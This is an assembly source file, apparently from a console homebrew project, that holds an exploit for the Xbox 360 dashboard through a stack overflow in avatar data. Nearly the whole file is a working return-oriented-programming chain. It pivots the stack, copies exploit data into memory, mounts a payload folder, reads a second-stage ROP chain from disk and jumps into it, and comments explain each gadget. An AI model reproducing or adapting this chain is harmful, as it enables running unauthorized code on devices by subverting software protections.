# Description: Exploit for the Xbox 360 dashboard using Avatars
# Author: shutterbug2000


# Compiler flags, must be set before any code or include directives:
.include "BuildConfig.asm"

# Include the header for the data segment file.
.include "BadUpdateExploit_Data_h.asm"

# Include additional files:
.include "Gadgets.asm"

.set ExploitDataSegmentAddress,             Stage1Address + (_data_segment_start - _chain_start)
.set ExploitDataSegmentSize,                _data_segment_end - _data_segment_start

.set exploit_base_addr_ptr,                Stage1Address + (_data_base_address_ptr - _chain_start)

#---------------------------------------------------------
# Gap name stack overflow
#---------------------------------------------------------
_data_start:
        
stack_data:
        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .long   __restgprlr_31          # r12 - address of the next ROP gadget
        .long   0x00000000

        ###########################################################
        # Gadget N: copy exploit data into large allocation for easier access
        #
        #   r3 = dst address = address in large allocation segment
        #   r4 = src address = address of raw file data
        #   r5 = size to copy = size of data segment data
        ###########################################################
        CALL_FUNC 11, memcpy, R3H=0, R3L=Stage1Address, R4H=0, R4L=RawFileAddress + (_chain_start), R5H=0, R5L=0x8000
        
        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   stack_pivot                             # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: stack pivot into the loop
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
        .long   Stage1Address + 8              # stack address for the start of the loop to pivot to

_chain_start:        
        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .long   __restgprlr_31          # r12 - address of the next ROP gadget
        .long   0x00000000
        
        ###########################################################
        # Gadget N: copy exploit data into large allocation for easier access
        #
        #   r3 = dst address = address in large allocation
        #   r4 = src address = address of raw file data
        #   r5 = size to copy = size of data segment data
        ###########################################################
        CALL_FUNC 11, memcpy, R3H=0, R3L=RuntimeDataSegmentAddress, R4H=0, R4L=ExploitDataSegmentAddress, R5H=0, R5L=ExploitDataSegmentSize
        
        ###########################################################
        # Gadget N: mount the payload folder so we can read the second stage ROP chain file
        #
        ###########################################################
        CALL_FUNC 11, 0x921875C0, R3H=0, R3L=hdd_symlink_mount_str, R4H=0, R4L=hdd_symlink_path_str
        
        ###########################################################
        # Gadget N: read the secondary ROP chain file into memory
        #
        ###########################################################
    _rf_offset = (1f - _chain_start)
1:      READ_FILE secondary_payload_file_path, second_stage_chain_address, exploit_base_addr_ptr, _rf_offset
        
        ###########################################################
        # Gadget N: offset the second stage ROP chain address to compensate for the stack pivot gadget used
        #
        ###########################################################
        LOAD_ADD_STORE second_stage_chain_address, 8 + second_stage_offset
        
        ###########################################################
        # Gadget N: write new stack pointer address into stack pivot gadget data
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, exploit_base_addr_ptr, 1f - _chain_start, second_stage_chain_address
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   stack_pivot                         # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: pivot to second stage ROP chain
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
1:      .long   0x41414141              # new stack pointer address, written by previous gadgets


        # Pad the data to the next 4 byte boundary.
        .long   0x00000000

_buffer_overflow_end:

_data_base_address_ptr:
        .long   Stage1Address

#---------------------------------------------------------
# Temporary data we copy to the .binkdata section
#---------------------------------------------------------

.include "BadUpdateExploit_Data.asm"

# Secret symbol table:
.long   0x69696969
.long   second_stage_chain_address

_data_end:

#---------------------------------------------------------
# End of file
#---------------------------------------------------------
.long 0xffffffff
